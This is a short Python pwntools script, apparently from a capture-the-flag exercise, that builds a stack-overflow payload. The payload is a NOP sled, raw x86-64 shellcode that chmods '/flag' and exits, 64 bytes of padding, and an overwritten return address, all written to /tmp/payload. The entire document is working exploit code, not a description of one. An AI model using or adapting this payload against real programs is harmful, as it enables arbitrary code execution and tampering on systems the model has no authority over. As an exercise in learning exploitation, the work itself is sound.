from pwn import *

# 1. Configuration
OFFSET = 8007
JUMP_TARGET = 0x7fffffffa9f8 

# 2. Shellcode: chmod("/flag", 4) then exit(0)
shellcode = b"\x48\x31\xc0\x50\x48\xbb\x2f\x2f\x2f\x2f\x66\x6c\x61\x67\x53\x48\x89\xe7\x6a\x04\x5e\x6a\x5a\x58\x0f\x05\x48\x31\xff\x6a\x3c\x58\x0f\x05"

# 3. SAFETY PADDING (The Fix)
#    We use 64 bytes instead of 8 to prevent the 'push' instructions
#    from overwriting the shellcode.
safety_padding = b"B" * 64

# 4. Construct
#    [ NOP SLED ] [ SHELLCODE ] [ SAFETY PADDING ] [ RET ADDR ]
total_used = len(shellcode) + len(safety_padding)
nop_len = OFFSET - total_used

if nop_len < 0:
    print("Error: Shellcode too big")
    exit()

payload = b"\x90" * nop_len
payload += shellcode
payload += safety_padding
payload += p64(JUMP_TARGET)

# 5. Write
open("/tmp/payload", "wb").write(payload)
print("[*] Payload fixed: Added 64 bytes of stack safety padding.")
